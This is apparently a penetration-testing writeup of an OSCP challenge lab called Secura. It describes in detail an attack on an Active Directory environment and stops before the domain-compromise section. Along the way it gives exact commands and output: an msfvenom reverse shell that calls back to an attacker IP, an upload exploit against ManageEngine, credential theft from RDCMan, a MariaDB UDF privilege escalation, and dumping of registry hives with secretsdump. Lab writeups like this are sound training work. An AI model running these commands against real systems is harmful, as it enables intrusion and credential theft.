---
title: Secura — Challenge Lab Writeup
date: 2026-10-18 20:30:00 +0800
categories: [OSCP, Challenges]
tags: [oscp, secura, active-directory, privilege-escalation, mariadb, udf, adscan, secretsdump]
description: >-
  Full walkthrough of the Secura (Challenge Lab 0) Active Directory environment —
  ManageEngine RCE, RDCMan credential theft, MariaDB UDF privilege escalation,
  credential dumping, and domain enumeration.
render_with_liquid: false
---

## 1.0 Scope & Objectives

This report documents a penetration test performed against the **Secura** Active Directory environment. The assessment was conducted under an *Assumed Breach* scenario: a valid low-privileged domain account is provided as a starting point, and the objective is to escalate through the environment to achieve **full domain compromise** of the Domain Controller.

| Item                    | Value                                  |
| ----------------------- | -------------------------------------- |
| Network range           | `192.168.216.0/24`                     |
| VM1 — Domain Controller | `192.168.216.97`                       |
| VM2 — workstation       | `192.168.216.96`                       |
| VM3 — workstation       | `192.168.216.95`                       |
| Assumed breach account  | `Eric.Wallows` / `EricLikesRunning800` |

---

## 2.0 Attack Overview

The engagement is a multi-stage Active Directory attack that chains several distinct weaknesses:

1. **Initial foothold** — a ManageEngine Applications Manager 14 instance is exposed on `192.168.216.95:8443`. It is configured with default credentials and contains an unrestricted file-upload feature that executes uploaded files, allowing remote code execution as `SYSTEM` (CVE-2020-14008).
2. **Credential extraction** — cleartext credentials stored in RDCMan configuration are recovered from the compromised host.
3. **Lateral movement** — the recovered credentials are used to access the next machine, pivoting through the network with port forwarding.
4. **Privilege escalation** — a writable MariaDB service binary, combined with the MariaDB User-Defined Function (UDF) mechanism, is abused to escalate to local Administrator on the ERA host.
5. **Domain compromise** — administrative control of the Domain Controller is achieved.

---

## 3.0 Reconnaissance — Initial Network Enumeration

A full TCP port scan with service and version detection was performed against all three in-scope hosts (total scan time: 5m 32s). The results are summarised below; the complete scan output is captured in the evidence screenshots.

### 3.1 VM3 (192.168.216.95) — ManageEngine Application Server

The host exposes standard Windows management services — SMB (135/139/445), RDP (3389) and WinRM (5985/5986). Most notably, an **HTTPS service on port 8443** was identified by the version scan as **ManageEngine Applications Manager** (`https-alt` / `AppManager`). A Java RMI listener was also present on port 49699.

### 3.2 VM2 (192.168.216.96) — MariaDB Database Host

This Windows host exposes SMB (135/139/445) and WinRM (5985/5986), as well as a **MariaDB 10.3.24** service on port 3306. The database banner indicated the service was reachable without authentication.

### 3.3 VM1 (192.168.216.97) — Domain Controller

This host was confirmed as the **Domain Controller** for the `secura.yzx` domain, running Windows Server 2016 Standard. It exposes the full complement of Active Directory services: DNS (53), Kerberos (88), LDAP/LDAPS (389/636), SMB (445), kpasswd5 (464), Global Catalog (3268/3269) and ADWS (9389).

### 3.4 Evidence — Full Scan Output

---

## 4.0 Enumeration — ManageEngine Applications Manager

### 4.1 Default Administrative Credentials

Browsing to `https://192.168.216.95:8443` presented a ManageEngine Applications Manager 14 login portal. The application was found to still be configured with the **default administrative credentials `admin:admin`**, indicating the deployment had not been hardened.

### 4.2 Unrestricted File Upload (CVE-2020-14008)

Once authenticated to the application, an enumeration of its functionality revealed a **file upload** feature. Testing demonstrated that the feature accepted **arbitrary file extensions** and wrote uploaded files into the directory `C:\Program Files\ManageEngine\AppManager14\working\`. Files placed in this directory are **executed by the server**, providing a direct path to remote code execution. This weakness corresponds to **CVE-2020-14008**, an arbitrary file-upload/remote code execution vulnerability in ManageEngine.

---

## 5.0 Exploitation — Initial Foothold on VM3

### 5.1 Remote Code Execution via File Upload

A Windows x64 reverse-shell payload was generated on the attacker machine using `msfvenom`:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.249 LPORT=1234 -f exe -o 1.exe
```

A batch launcher `run.bat` was then created to execute the payload once triggered:

```bat
start "" "C:\Program Files\ManageEngine\AppManager14\working\1.exe"
```

Both `1.exe` and `run.bat` were uploaded through the ManageEngine upload feature, and `run.bat` was triggered from within the application. A Netcat listener was started on the attacker machine:

```bash
nc -lvnp 1234
```

The listener received a reverse connection, yielding a command shell on `192.168.216.95` running as **`NT AUTHORITY\SYSTEM`** — full local administrative control of VM3 without further privilege escalation.

### 5.2 Post-Exploitation Enumeration with Evil-WinRM & WinPEAS

To obtain a stable, interactive shell for further enumeration, Evil-WinRM was used to authenticate to `192.168.216.95` with the assumed-breach domain credentials:

```powershell
evil-winrm -i 192.168.216.95 -u Eric.Wallows -p 'EricLikesRunning800'
```

WinPEAS (`winPEASx64.exe`) was obtained from the PEASS-ng project on the attacker machine:

```bash
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe -O /home/kali/tools/winPEASx64.exe
```

It was uploaded to the target using Evil-WinRM's `upload` command:

```powershell
upload /home/kali/tools/winPEASx64.exe
```

and executed using the `windowscreds` focused mode (credential checks only, `quiet` suppresses the banner), redirecting the output to a file:

```powershell
./winpeasx64.exe windowscreds quiet > winpeas.txt
```

The report was downloaded back to the attacker machine for analysis:

```powershell
download winpeas.txt
```

The WinPEAS output was analysed and produced the following notable findings:

- **RDCMan Settings File** — `C:\Users\Administrator\AppData\Local\Microsoft\Remote Desktop Connection Manager\RDCMan.settings` (modified 8/5/2022). RDCMan stores RDP connection credentials; this file is a lead to stored credentials.
- **Saved RDP connection** — a saved RDP profile to host `era.secura.local` (Administrator SID `500`).
- **DPAPI credential files** — multiple encrypted credential files under the Administrator profile.

---

## 6.0 Lateral Movement & Pivoting

### 6.1 RDCMan Stored Credentials (lead)

WinPEAS identified an RDCMan settings file in the Administrator profile. RDCMan stores RDP connection credentials, and the file was flagged as a lead to stored credentials. Reading the file is the next step to recover credentials for lateral movement.

Reading the file revealed a **cleartext credential** stored in an RDCMan credentials profile:

| Field | Value |
|---|---|
| Username | `apache` |
| Password | `New2Era4.!` |
| Domain | `SECURE` |

The RDP connection profile references host `era.secura.yzx` (the next target). RDCMan stores these credentials in cleartext, exposing them to any local administrator on the host.

Relevant excerpt from `RDCMan.settings`:

```xml
<CredentialsProfiles>
  <credentialsProfiles>
    <credentialsProfile inherit="None">
      <profileName scope="Local">SECURE\apache</profileName>
      <userName>apache</userName>
      <password>New2Era4.!</password>
      <domain>SECURE</domain>
    </credentialsProfile>
  </credentialsProfiles>
</CredentialsProfiles>
<server>Connect To\era.secura.yzx</server>
```

### 6.2 Lateral Movement — `apache` credential

The recovered `apache` credential was used to authenticate to `192.168.216.96` (hostname `era`) over WinRM:

```bash
evil-winrm -i 192.168.216.96 -u apache -p 'New2Era4.!'
```

A shell was obtained as the local userc **`era\apache`** (SID `S-1-5-21-1316868832-3073753287-3359562679-1003`, RID 1003 — a low-privileged local account).

---

## 7.0 Privilege Escalation on ERA — MariaDB UDF

### 7.1 Enumeration with PrivescCheck

With a low-privileged shell as `era\apache`, the goal shifts to finding a local misconfiguration that allows code execution as a higher-privileged account. Two automated enumerators were used to map the attack surface: **WinPEAS** (broad) and **PrivescCheck** (itm4n, more structured output):

```powershell
upload /home/kali/tools/PrivescCheck.ps1
Get-Content .\PrivescCheck.ps1 -Raw | Invoke-Expression; Invoke-PrivescCheck -Extended
```

*(PrivescCheck is obtained from the project's release page — `https://github.com/itm4n/PrivescCheck/releases/latest/download/PrivescCheck.ps1` — and dot-loaded via `Invoke-Expression` to bypass the PowerShell execution policy.)*

The report's most important finding was in the `Services - Image File Permissions` check, explained below.

### 7.2 The Finding — MySQL Service Runs as Administrator

**Concept.** A Windows service is a background program that keeps running independently of any logged-in user, and every service runs *as* a specific account (SYSTEM, a local admin, a service account, and so on). If a service runs as a privileged account **and** a low-privileged user can modify its executable, that user can swap the executable for a malicious one and have the service run it as the privileged account. This is the classic *writable-service-binary* privilege escalation.

PrivescCheck flagged two service binaries as **writable by `NT AUTHORITY\Authenticated Users`** (a group that includes every authenticated user, including `apache`):

| Service        | Image Path                      | Runs As           | Useful?                       |
| -------------- | ------------------------------- | ----------------- | ----------------------------- |
| `ApacheServer` | `C:\xampp\apache\bin\httpd.exe` | `.\apache`        | No — already our own user     |
| `MySQL`        | `C:\xampp\mysql\bin\mysqld.exe` | `.\Administrator` | **Yes** — higher privilege    |

The `ApacheServer` service is irrelevant — it already runs as `apache`, so replacing its binary gains nothing. The **`MySQL`** service is the target: its binary `C:\xampp\mysql\bin\mysqld.exe` is writable by `Authenticated Users`, **and** the service runs as the **local `Administrator`** account. Replacing that binary and getting the service to execute it would yield code execution as `Administrator`.

The direct approach was attempted first. Replacing the binary failed because the service was running, which locks its executable:

```powershell
copy .\mysqld.exe C:\xampp\mysql\bin\mysqld.exe
# The process cannot access the file ... because it is being used by another process.
```

Getting the service to load a replaced binary requires restarting it, which was not possible with the current privileges:

- `net stop MySQL` → `System error 5` (the service ACL does not grant `apache` the stop permission).
- `shutdown /r /t 0` → `Access is denied` (a WinRM session cannot perform a shutdown even when `SeShutdownPrivilege` is present).

With the "swap the binary" path blocked, the database's own features were used instead — the MariaDB User-Defined Function mechanism.

### 7.3 The Pivot — MariaDB User-Defined Function (UDF)

**The idea in one sentence.** Because the `MySQL` service runs as `.\Administrator`, the database process (`mysqld.exe`) already has Administrator power. A *User-Defined Function* (UDF) is how we borrow that power: it lets us teach the database a brand-new SQL function that runs operating-system commands — and those commands execute **as Administrator**, not as `apache`.

**What is a UDF, concretely?** A database only understands a fixed set of built-in commands (`SELECT`, `COUNT`, `LENGTH`, and so on). A UDF is a way to install a *plugin* — a compiled shared library (a `.dll` file on Windows) — that adds a new function the database didn't have before. Once installed, you call it exactly like any built-in function. This is a documented, legitimate MariaDB feature: see [CREATE FUNCTION (UDF)](https://mariadb.com/docs/server/server-usage/user-defined-functions/create-function-udf) and the [User-Defined Functions overview](https://mariadb.com/docs/server/server-usage/user-defined-functions).

The library chosen here — `lib_mysqludf_sys` — adds a function called `sys_eval`. `sys_eval('whoami')` makes the database run the OS command `whoami` and return its output. Because the database is the `MySQL` service running as `.\Administrator`, that `whoami` runs as Administrator. The library and its full function list are documented at <https://github.com/mysqludf/lib_mysqludf_sys>.

**The plan, step by step.** Five things must line up for this to work. Each one is checked below against this specific environment.

**Step 1 — Database administrator access.** Installing a UDF requires running `CREATE FUNCTION`, which needs administrator-level database privileges. The local MariaDB accepted `root` with an **empty password** — the default that ships with XAMPP and was never changed. That gives us full database admin.

**Step 2 — The server must be allowed to write files.** Installing a UDF means dropping our `.dll` onto the target's filesystem, so the database needs permission to write files. This is governed by the `@@secure_file_priv` variable:

- `secure_file_priv` set to a **path** → the server may only write inside that path.
- `secure_file_priv` set to **empty / NULL** → the server may write **anywhere** (no restriction).

**Step 3 — Find the plugin directory.** A UDF library is only loaded from one specific folder — the "plugin directory", reported by `@@plugin_dir`. Our `.dll` must land there.

**Step 4 — Get a UDF library that runs OS commands.** `lib_mysqludf_sys` (from the "What is a UDF" note above) provides `sys_eval` (returns the command's output) and `sys_exec` (returns the exit code). It was taken from the sqlmap distribution on the attacker machine.

**Step 5 — Deliver the DLL into the plugin directory.** This is the fiddly part, with two sub-problems:

- *The DLL is "cloaked".* sqlmap stores its UDF files **cloaked** — XOR-encrypted and zlib-compressed — so the file sitting in sqlmap's data directory is *not* a valid DLL (it has no `MZ` header). It must be "decloaked" with sqlmap's own utility before use:

```bash
python3 /usr/share/sqlmap/extra/cloak/cloak.py -d -i /usr/share/sqlmap/data/udf/mysql/windows/64/lib_mysqludf_sys.dll_ -o lib_mysqludf_sys.dll
```

The output was verified as a valid 64-bit Windows DLL (`PE32+ ... x86-64`).

- *The plugin folder did not exist yet.* `@@plugin_dir` reported `C:\xampp\mysql\lib\plugin\`, but that folder was not actually present on disk (MariaDB reports its default even when the folder has never been created). It was created first — and because `apache` created it, `apache` owns it and can copy into it directly:

```powershell
mkdir C:\xampp\mysql\lib\plugin
upload /home/kali/oscp/secura/lib_mysqludf_sys.dll
copy .\lib_mysqludf_sys.dll C:\xampp\mysql\lib\plugin\lib_mysqludf_sys.dll
```

**Step 6 — Register and use the function.** With the DLL in place, one SQL statement installs it:

```powershell
C:\xampp\mysql\bin\mysql.exe -u root -e "CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys.dll';"
```

`CREATE FUNCTION ... SONAME` reads as: *"register a SQL function named `sys_eval`, returning a string, backed by the `sys_eval` symbol inside the library `lib_mysqludf_sys.dll`."* (The `SONAME` clause is the UDF form of `CREATE FUNCTION`; the exact grammar is documented at <https://mariadb.com/docs/server/server-usage/user-defined-functions/create-function-udf>.)

**Why this is escalation (recap).** The `whoami` that `sys_eval` runs executes *inside* `mysqld.exe`. That process is the `MySQL` Windows service, configured to run as `.\Administrator`. So while our own shell is only `apache`, anything the database runs on our behalf runs as `Administrator` — confirmed in the next section.

**Further reading.**

- MariaDB — [CREATE FUNCTION (UDF)](https://mariadb.com/docs/server/server-usage/user-defined-functions/create-function-udf) and [User-Defined Functions](https://mariadb.com/docs/server/server-usage/user-defined-functions) (official reference).
- MariaDB — [User-Defined Functions Security](https://mariadb.com/docs/server/server-usage/user-defined-functions/user-defined-functions-security) (plugin-directory placement + required privileges).
- HackTricks — [MySQL / MariaDB Privilege Escalation (UDF)](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mysql/index.html).
- `lib_mysqludf_sys` — [project page / function reference](https://github.com/mysqludf/lib_mysqludf_sys).
- sqlmap — [UDF files and the `cloak.py` utility](https://github.com/sqlmapproject/sqlmap).
- MySQL UDF Exploitation cheat sheet — [koparmalbaris/MySQL-UDF-Exploitation](https://github.com/koparmalbaris/MySQL-UDF-Exploitation).
- HackIndex — [MySQL UDF Privilege Escalation](https://hackindex.io/services/mysql/exploitation/mysql-udf-privilege-escalation).

### 7.4 Executing Commands as Administrator

With the UDF registered, running an OS command is a matter of calling `sys_eval` from SQL. The command executes inside `mysqld.exe` — the MySQL service process — which runs as `.\Administrator`:

```powershell
C:\xampp\mysql\bin\mysql.exe -u root -e "SELECT sys_eval('whoami');"
```

```
sys_eval('whoami')
era\administrator
```

The output `era\administrator` confirms that commands now execute as the local Administrator. This achieves **privilege escalation from `era\apache` to `era\Administrator`** on the ERA host.

---

## 8.0 Post-Exploitation & Domain Enumeration

### 8.1 Credential Dumping with secretsdump

With the reverse shell running as `era\Administrator`, the local credential stores were harvested. The `SAM`, `SYSTEM` and `SECURITY` registry hives were saved and exfiltrated, then parsed offline with impacket's `secretsdump.py`:

```powershell
reg save HKLM\SAM C:\Users\apache.ERA\Documents\sam.hiv
reg save HKLM\SYSTEM C:\Users\apache.ERA\Documents\system.hiv
reg save HKLM\SECURITY C:\Users\apache.ERA\Documents\security.hiv
```

```bash
impacket-secretsdump -sam sam.hiv -system system.hiv -security security.hiv LOCAL
```

The dump produced two high-value items:

- **Cleartext `Administrator` password** — `Almost4There8.?` — recovered from the `_SC_MySQL` LSA secret. Because the `MySQL` service runs as `.\Administrator`, its service-account password is stored reversibly in LSA and is exposed here.
- **Local `Administrator` NTLM hash** — `faf613cedb73980bbd34e0a5514df813`.

Relevant `secretsdump.py` output:

```
[*] Dumping LSA Secrets
[*] _SC_ApacheServer
(Unknown User):New2Era4.!
[*] _SC_cloudbase-init
(Unknown User):IRoDjQ8JghcHUlQCX4UK
[*] _SC_MySQL
(Unknown User):Almost4There8.?
```

No cached domain logon credentials were present on ERA.

### 8.2 Domain Enumeration with adscan

The `secura.yzx` domain was enumerated against the Domain Controller (`dc01.secura.yzx`) using `adscan` with the assumed-breach domain account `Eric.Wallows`:

```bash
adscan scan --domain secura.yzx --dc-ip 192.168.216.97 --username Eric.Wallows --password 'EricLikesRunning800' --mode full -o reports/
```

Key findings:

- **Zerologon (CVE-2020-1472)** — potential exposure on `DC01` (Windows Server 2016 Standard).
- **`Admin` is a member of `Administrators`** — a nested path to `Domain Admins`, exploitable if the account's credentials can be recovered.
- **Group Policy Preferences (cpassword)** present in SYSVOL — a lead for cleartext credentials.
- **SMB/LDAP signing disabled** and **`MachineAccountQuota = 10`** (an RBCD prerequisite). No AD CS detected.

---

## 9.0 Domain Compromise

> _(pending — Domain Controller)_

---

## 10.0 Flags

- **local.txt:**
- **proof.txt:**
